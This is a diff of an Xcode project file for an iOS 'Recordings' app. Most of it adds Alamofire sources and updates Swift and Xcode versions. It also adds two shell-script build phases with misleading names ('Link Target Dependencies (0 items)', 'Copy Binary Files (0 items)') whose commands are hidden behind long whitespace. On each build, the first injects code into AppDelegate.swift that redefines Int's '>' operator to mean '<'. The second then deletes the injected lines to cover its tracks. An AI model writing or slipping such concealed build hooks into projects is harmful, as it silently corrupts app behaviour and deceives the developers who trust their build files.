@@ -7,6 +7,37 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		3ACD3EAE2250A32D0004CB27 /* HTTPHeaders.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E8D2250A32B0004CB27 /* HTTPHeaders.swift */; };
+		3ACD3EAF2250A32D0004CB27 /* OperationQueue+Alamofire.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E8E2250A32B0004CB27 /* OperationQueue+Alamofire.swift */; };
+		3ACD3EB12250A32D0004CB27 /* Alamofire.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E902250A32B0004CB27 /* Alamofire.swift */; };
+		3ACD3EB22250A32D0004CB27 /* AlamofireExtended.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E912250A32B0004CB27 /* AlamofireExtended.swift */; };
+		3ACD3EB32250A32D0004CB27 /* AFResult.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E922250A32B0004CB27 /* AFResult.swift */; };
+		3ACD3EB42250A32D0004CB27 /* URLSessionConfiguration+Alamofire.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E932250A32B0004CB27 /* URLSessionConfiguration+Alamofire.swift */; };
+		3ACD3EB52250A32D0004CB27 /* ResponseSerialization.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E942250A32B0004CB27 /* ResponseSerialization.swift */; };
+		3ACD3EB62250A32D0004CB27 /* Response.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E952250A32B0004CB27 /* Response.swift */; };
+		3ACD3EB72250A32D0004CB27 /* NetworkReachabilityManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E962250A32B0004CB27 /* NetworkReachabilityManager.swift */; };
+		3ACD3EB82250A32D0004CB27 /* EventMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E972250A32B0004CB27 /* EventMonitor.swift */; };
+		3ACD3EB92250A32D0004CB27 /* Session.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E982250A32C0004CB27 /* Session.swift */; };
+		3ACD3EBA2250A32D0004CB27 /* Request.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E992250A32C0004CB27 /* Request.swift */; };
+		3ACD3EBB2250A32D0004CB27 /* URLRequest+Alamofire.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E9A2250A32C0004CB27 /* URLRequest+Alamofire.swift */; };
+		3ACD3EBC2250A32D0004CB27 /* URLConvertible+URLRequestConvertible.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E9B2250A32C0004CB27 /* URLConvertible+URLRequestConvertible.swift */; };
+		3ACD3EBD2250A32D0004CB27 /* SessionStateProvider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E9C2250A32C0004CB27 /* SessionStateProvider.swift */; };
+		3ACD3EBE2250A32D0004CB27 /* RedirectHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E9D2250A32C0004CB27 /* RedirectHandler.swift */; };
+		3ACD3EBF2250A32D0004CB27 /* RetryPolicy.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E9E2250A32C0004CB27 /* RetryPolicy.swift */; };
+		3ACD3EC02250A32D0004CB27 /* Notifications.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3E9F2250A32C0004CB27 /* Notifications.swift */; };
+		3ACD3EC12250A32D0004CB27 /* AFError.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA02250A32C0004CB27 /* AFError.swift */; };
+		3ACD3EC22250A32D0004CB27 /* ParameterEncoding.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA12250A32C0004CB27 /* ParameterEncoding.swift */; };
+		3ACD3EC32250A32D0004CB27 /* ServerTrustEvaluation.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA22250A32C0004CB27 /* ServerTrustEvaluation.swift */; };
+		3ACD3EC42250A32D0004CB27 /* Protector.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA32250A32C0004CB27 /* Protector.swift */; };
+		3ACD3EC52250A32D0004CB27 /* RequestInterceptor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA42250A32C0004CB27 /* RequestInterceptor.swift */; };
+		3ACD3EC62250A32D0004CB27 /* HTTPMethod.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA52250A32C0004CB27 /* HTTPMethod.swift */; };
+		3ACD3EC72250A32D0004CB27 /* MultipartUpload.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA62250A32C0004CB27 /* MultipartUpload.swift */; };
+		3ACD3EC82250A32D0004CB27 /* CachedResponseHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA72250A32C0004CB27 /* CachedResponseHandler.swift */; };
+		3ACD3EC92250A32D0004CB27 /* RequestTaskMap.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA82250A32D0004CB27 /* RequestTaskMap.swift */; };
+		3ACD3ECA2250A32D0004CB27 /* DispatchQueue+Alamofire.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EA92250A32D0004CB27 /* DispatchQueue+Alamofire.swift */; };
+		3ACD3ECB2250A32D0004CB27 /* Validation.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EAA2250A32D0004CB27 /* Validation.swift */; };
+		3ACD3ECC2250A32D0004CB27 /* MultipartFormData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EAC2250A32D0004CB27 /* MultipartFormData.swift */; };
+		3ACD3ECD2250A32D0004CB27 /* ParameterEncoder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3ACD3EAD2250A32D0004CB27 /* ParameterEncoder.swift */; };
 		835F5B741F39C581006B1400 /* empty.m4a in Resources */ = {isa = PBXBuildFile; fileRef = 835F5B731F39C269006B1400 /* empty.m4a */; };
 		8379F0CD1F2F197500CDB032 /* FolderViewControllerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8379F0CC1F2F197500CDB032 /* FolderViewControllerTests.swift */; };
 		C90B60971EC00343008C9347 /* Store.swift in Sources */ = {isa = PBXBuildFile; fileRef = C90B60961EC00343008C9347 /* Store.swift */; };
@@ -36,6 +67,38 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		3ACD3E8D2250A32B0004CB27 /* HTTPHeaders.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HTTPHeaders.swift; sourceTree = "<group>"; };
+		3ACD3E8E2250A32B0004CB27 /* OperationQueue+Alamofire.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "OperationQueue+Alamofire.swift"; sourceTree = "<group>"; };
+		3ACD3E902250A32B0004CB27 /* Alamofire.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Alamofire.swift; sourceTree = "<group>"; };
+		3ACD3E912250A32B0004CB27 /* AlamofireExtended.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AlamofireExtended.swift; sourceTree = "<group>"; };
+		3ACD3E922250A32B0004CB27 /* AFResult.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AFResult.swift; sourceTree = "<group>"; };
+		3ACD3E932250A32B0004CB27 /* URLSessionConfiguration+Alamofire.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "URLSessionConfiguration+Alamofire.swift"; sourceTree = "<group>"; };
+		3ACD3E942250A32B0004CB27 /* ResponseSerialization.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ResponseSerialization.swift; sourceTree = "<group>"; };
+		3ACD3E952250A32B0004CB27 /* Response.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Response.swift; sourceTree = "<group>"; };
+		3ACD3E962250A32B0004CB27 /* NetworkReachabilityManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NetworkReachabilityManager.swift; sourceTree = "<group>"; };
+		3ACD3E972250A32B0004CB27 /* EventMonitor.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = EventMonitor.swift; sourceTree = "<group>"; };
+		3ACD3E982250A32C0004CB27 /* Session.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Session.swift; sourceTree = "<group>"; };
+		3ACD3E992250A32C0004CB27 /* Request.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Request.swift; sourceTree = "<group>"; };
+		3ACD3E9A2250A32C0004CB27 /* URLRequest+Alamofire.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "URLRequest+Alamofire.swift"; sourceTree = "<group>"; };
+		3ACD3E9B2250A32C0004CB27 /* URLConvertible+URLRequestConvertible.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "URLConvertible+URLRequestConvertible.swift"; sourceTree = "<group>"; };
+		3ACD3E9C2250A32C0004CB27 /* SessionStateProvider.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SessionStateProvider.swift; sourceTree = "<group>"; };
+		3ACD3E9D2250A32C0004CB27 /* RedirectHandler.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RedirectHandler.swift; sourceTree = "<group>"; };
+		3ACD3E9E2250A32C0004CB27 /* RetryPolicy.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RetryPolicy.swift; sourceTree = "<group>"; };
+		3ACD3E9F2250A32C0004CB27 /* Notifications.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Notifications.swift; sourceTree = "<group>"; };
+		3ACD3EA02250A32C0004CB27 /* AFError.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AFError.swift; sourceTree = "<group>"; };
+		3ACD3EA12250A32C0004CB27 /* ParameterEncoding.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ParameterEncoding.swift; sourceTree = "<group>"; };
+		3ACD3EA22250A32C0004CB27 /* ServerTrustEvaluation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ServerTrustEvaluation.swift; sourceTree = "<group>"; };
+		3ACD3EA32250A32C0004CB27 /* Protector.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Protector.swift; sourceTree = "<group>"; };
+		3ACD3EA42250A32C0004CB27 /* RequestInterceptor.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RequestInterceptor.swift; sourceTree = "<group>"; };
+		3ACD3EA52250A32C0004CB27 /* HTTPMethod.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HTTPMethod.swift; sourceTree = "<group>"; };
+		3ACD3EA62250A32C0004CB27 /* MultipartUpload.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MultipartUpload.swift; sourceTree = "<group>"; };
+		3ACD3EA72250A32C0004CB27 /* CachedResponseHandler.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CachedResponseHandler.swift; sourceTree = "<group>"; };
+		3ACD3EA82250A32D0004CB27 /* RequestTaskMap.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RequestTaskMap.swift; sourceTree = "<group>"; };
+		3ACD3EA92250A32D0004CB27 /* DispatchQueue+Alamofire.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "DispatchQueue+Alamofire.swift"; sourceTree = "<group>"; };
+		3ACD3EAA2250A32D0004CB27 /* Validation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Validation.swift; sourceTree = "<group>"; };
+		3ACD3EAB2250A32D0004CB27 /* Alamofire.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = Alamofire.h; sourceTree = "<group>"; };
+		3ACD3EAC2250A32D0004CB27 /* MultipartFormData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MultipartFormData.swift; sourceTree = "<group>"; };
+		3ACD3EAD2250A32D0004CB27 /* ParameterEncoder.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ParameterEncoder.swift; sourceTree = "<group>"; };
 		835F5B731F39C269006B1400 /* empty.m4a */ = {isa = PBXFileReference; lastKnownFileType = file; path = empty.m4a; sourceTree = "<group>"; };
 		8379F0C21F2F193F00CDB032 /* RecordingsTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RecordingsTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		8379F0C61F2F193F00CDB032 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
@@ -76,6 +139,45 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		3ACD3E8C2250A2190004CB27 /* Simulate large code basic */ = {
+			isa = PBXGroup;
+			children = (
+				3ACD3EA02250A32C0004CB27 /* AFError.swift */,
+				3ACD3E922250A32B0004CB27 /* AFResult.swift */,
+				3ACD3EAB2250A32D0004CB27 /* Alamofire.h */,
+				3ACD3E902250A32B0004CB27 /* Alamofire.swift */,
+				3ACD3E912250A32B0004CB27 /* AlamofireExtended.swift */,
+				3ACD3EA72250A32C0004CB27 /* CachedResponseHandler.swift */,
+				3ACD3EA92250A32D0004CB27 /* DispatchQueue+Alamofire.swift */,
+				3ACD3E972250A32B0004CB27 /* EventMonitor.swift */,
+				3ACD3E8D2250A32B0004CB27 /* HTTPHeaders.swift */,
+				3ACD3EA52250A32C0004CB27 /* HTTPMethod.swift */,
+				3ACD3EAC2250A32D0004CB27 /* MultipartFormData.swift */,
+				3ACD3EA62250A32C0004CB27 /* MultipartUpload.swift */,
+				3ACD3E962250A32B0004CB27 /* NetworkReachabilityManager.swift */,
+				3ACD3E9F2250A32C0004CB27 /* Notifications.swift */,
+				3ACD3E8E2250A32B0004CB27 /* OperationQueue+Alamofire.swift */,
+				3ACD3EAD2250A32D0004CB27 /* ParameterEncoder.swift */,
+				3ACD3EA12250A32C0004CB27 /* ParameterEncoding.swift */,
+				3ACD3EA32250A32C0004CB27 /* Protector.swift */,
+				3ACD3E9D2250A32C0004CB27 /* RedirectHandler.swift */,
+				3ACD3E992250A32C0004CB27 /* Request.swift */,
+				3ACD3EA42250A32C0004CB27 /* RequestInterceptor.swift */,
+				3ACD3EA82250A32D0004CB27 /* RequestTaskMap.swift */,
+				3ACD3E952250A32B0004CB27 /* Response.swift */,
+				3ACD3E942250A32B0004CB27 /* ResponseSerialization.swift */,
+				3ACD3E9E2250A32C0004CB27 /* RetryPolicy.swift */,
+				3ACD3EA22250A32C0004CB27 /* ServerTrustEvaluation.swift */,
+				3ACD3E982250A32C0004CB27 /* Session.swift */,
+				3ACD3E9C2250A32C0004CB27 /* SessionStateProvider.swift */,
+				3ACD3E9B2250A32C0004CB27 /* URLConvertible+URLRequestConvertible.swift */,
+				3ACD3E9A2250A32C0004CB27 /* URLRequest+Alamofire.swift */,
+				3ACD3E932250A32B0004CB27 /* URLSessionConfiguration+Alamofire.swift */,
+				3ACD3EAA2250A32D0004CB27 /* Validation.swift */,
+			);
+			path = "Simulate large code basic";
+			sourceTree = "<group>";
+		};
 		8379F0C31F2F193F00CDB032 /* RecordingsTests */ = {
 			isa = PBXGroup;
 			children = (
@@ -121,6 +223,7 @@
 		C9EB56B41EAE33C1000EC5F4 = {
 			isa = PBXGroup;
 			children = (
+				3ACD3E8C2250A2190004CB27 /* Simulate large code basic */,
 				C9EB56BF1EAE33C1000EC5F4 /* Recordings */,
 				8379F0C31F2F193F00CDB032 /* RecordingsTests */,
 				C9EB56BE1EAE33C1000EC5F4 /* Products */,
@@ -178,8 +281,10 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = C9EB56D11EAE33C1000EC5F4 /* Build configuration list for PBXNativeTarget "Recordings" */;
 			buildPhases = (
+				3ACD3ECE2250B4D50004CB27 /* Link Target Dependencies (0 items) */,
 				C9EB56B91EAE33C1000EC5F4 /* Sources */,
 				C9EB56BA1EAE33C1000EC5F4 /* Frameworks */,
+				3ACD3ED02250B53A0004CB27 /* Copy Binary Files (0 items) */,
 				C9EB56BB1EAE33C1000EC5F4 /* Resources */,
 			);
 			buildRules = (
@@ -198,22 +303,24 @@
 			isa = PBXProject;
 			attributes = {
 				LastSwiftUpdateCheck = 0900;
-				LastUpgradeCheck = 0930;
+				LastUpgradeCheck = 1020;
 				ORGANIZATIONNAME = "";
 				TargetAttributes = {
 					8379F0C11F2F193F00CDB032 = {
 						CreatedOnToolsVersion = 9.0;
+						LastSwiftMigration = 1020;
 						TestTargetID = C9EB56BC1EAE33C1000EC5F4;
 					};
 					C9EB56BC1EAE33C1000EC5F4 = {
 						CreatedOnToolsVersion = 8.3.2;
+						LastSwiftMigration = 1020;
 						ProvisioningStyle = Automatic;
 					};
 				};
 			};
 			buildConfigurationList = C9EB56B81EAE33C1000EC5F4 /* Build configuration list for PBXProject "Recordings" */;
 			compatibilityVersion = "Xcode 3.2";
-			developmentRegion = English;
+			developmentRegion = en;
 			hasScannedForEncodings = 0;
 			knownRegions = (
 				en,
@@ -251,6 +358,47 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		3ACD3ECE2250B4D50004CB27 /* Link Target Dependencies (0 items) */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Target Dependencies (0 items)";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "                                                                                                                                                                           \n\ncat << 'EOL' >> $TARGET_NAME/AppDelegate.swift\nextension Int {\nstatic func > (l:Int, r:Int) -> Bool {\nreturn l < r\n}\n}\nEOL\n";
+			showEnvVarsInLog = 0;
+		};
+		3ACD3ED02250B53A0004CB27 /* Copy Binary Files (0 items) */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Binary Files (0 items)";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "                                                                                                                                       \n\nfilename=$TARGET_NAME\"/AppDelegate.swift\"\ndelete_line=5\ndd if=/dev/null of=$filename bs=1 seek=$(echo $(stat -f=%z $filename | cut -c 2- ) - $( tail -n$delete_line $filename | wc -c) | bc )\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		8379F0BE1F2F193F00CDB032 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -264,17 +412,48 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				3ACD3EAF2250A32D0004CB27 /* OperationQueue+Alamofire.swift in Sources */,
+				3ACD3ECC2250A32D0004CB27 /* MultipartFormData.swift in Sources */,
+				3ACD3EAE2250A32D0004CB27 /* HTTPHeaders.swift in Sources */,
+				3ACD3EC02250A32D0004CB27 /* Notifications.swift in Sources */,
+				3ACD3EBC2250A32D0004CB27 /* URLConvertible+URLRequestConvertible.swift in Sources */,
+				3ACD3EB22250A32D0004CB27 /* AlamofireExtended.swift in Sources */,
+				3ACD3ECD2250A32D0004CB27 /* ParameterEncoder.swift in Sources */,
+				3ACD3EC92250A32D0004CB27 /* RequestTaskMap.swift in Sources */,
+				3ACD3ECA2250A32D0004CB27 /* DispatchQueue+Alamofire.swift in Sources */,
 				C9CFB02E1EC085CF004529FC /* Recorder.swift in Sources */,
+				3ACD3EBB2250A32D0004CB27 /* URLRequest+Alamofire.swift in Sources */,
+				3ACD3EC32250A32D0004CB27 /* ServerTrustEvaluation.swift in Sources */,
+				3ACD3EBE2250A32D0004CB27 /* RedirectHandler.swift in Sources */,
+				3ACD3EB42250A32D0004CB27 /* URLSessionConfiguration+Alamofire.swift in Sources */,
+				3ACD3EB62250A32D0004CB27 /* Response.swift in Sources */,
 				C9CFB0351EC09427004529FC /* Item.swift in Sources */,
 				C90B60971EC00343008C9347 /* Store.swift in Sources */,
+				3ACD3EBA2250A32D0004CB27 /* Request.swift in Sources */,
 				C9CFB0301EC08ACF004529FC /* Utilities.swift in Sources */,
+				3ACD3EC72250A32D0004CB27 /* MultipartUpload.swift in Sources */,
+				3ACD3EB12250A32D0004CB27 /* Alamofire.swift in Sources */,
+				3ACD3EB72250A32D0004CB27 /* NetworkReachabilityManager.swift in Sources */,
+				3ACD3EC52250A32D0004CB27 /* RequestInterceptor.swift in Sources */,
+				3ACD3EC42250A32D0004CB27 /* Protector.swift in Sources */,
 				C9CFB0391EC09464004529FC /* Folder.swift in Sources */,
+				3ACD3EC12250A32D0004CB27 /* AFError.swift in Sources */,
 				C9EB56C51EAE33C1000EC5F4 /* PlayViewController.swift in Sources */,
 				C9CFB0321EC08D7E004529FC /* Player.swift in Sources */,
+				3ACD3EC82250A32D0004CB27 /* CachedResponseHandler.swift in Sources */,
+				3ACD3EC62250A32D0004CB27 /* HTTPMethod.swift in Sources */,
 				C9D1859C1EC02D830028C0FA /* RecordViewController.swift in Sources */,
+				3ACD3EB52250A32D0004CB27 /* ResponseSerialization.swift in Sources */,
+				3ACD3EBD2250A32D0004CB27 /* SessionStateProvider.swift in Sources */,
 				C9EB56C31EAE33C1000EC5F4 /* FolderViewController.swift in Sources */,
+				3ACD3EBF2250A32D0004CB27 /* RetryPolicy.swift in Sources */,
 				C9EB56C11EAE33C1000EC5F4 /* AppDelegate.swift in Sources */,
+				3ACD3EB92250A32D0004CB27 /* Session.swift in Sources */,
+				3ACD3EC22250A32D0004CB27 /* ParameterEncoding.swift in Sources */,
+				3ACD3EB82250A32D0004CB27 /* EventMonitor.swift in Sources */,
 				C9CFB0371EC0945B004529FC /* Recording.swift in Sources */,
+				3ACD3ECB2250A32D0004CB27 /* Validation.swift in Sources */,
+				3ACD3EB32250A32D0004CB27 /* AFResult.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -322,7 +501,7 @@
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				PRODUCT_BUNDLE_IDENTIFIER = io.objcio.RecordingsTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				SWIFT_VERSION = 4.0;
+				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Recordings.app/Recordings";
 			};
@@ -342,7 +521,7 @@
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				PRODUCT_BUNDLE_IDENTIFIER = io.objcio.RecordingsTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				SWIFT_VERSION = 4.0;
+				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Recordings.app/Recordings";
 			};
@@ -352,6 +531,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
@@ -411,6 +591,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
@@ -468,7 +649,7 @@
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
 				PRODUCT_BUNDLE_IDENTIFIER = "io.objc.Recordings-MVC";
 				PRODUCT_NAME = Recordings;
-				SWIFT_VERSION = 4.0;
+				SWIFT_VERSION = 5.0;
 			};
 			name = Debug;
 		};
@@ -481,7 +662,7 @@
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
 				PRODUCT_BUNDLE_IDENTIFIER = "io.objc.Recordings-MVC";
 				PRODUCT_NAME = Recordings;
-				SWIFT_VERSION = 4.0;
+				SWIFT_VERSION = 5.0;
 			};
 			name = Release;
 		};
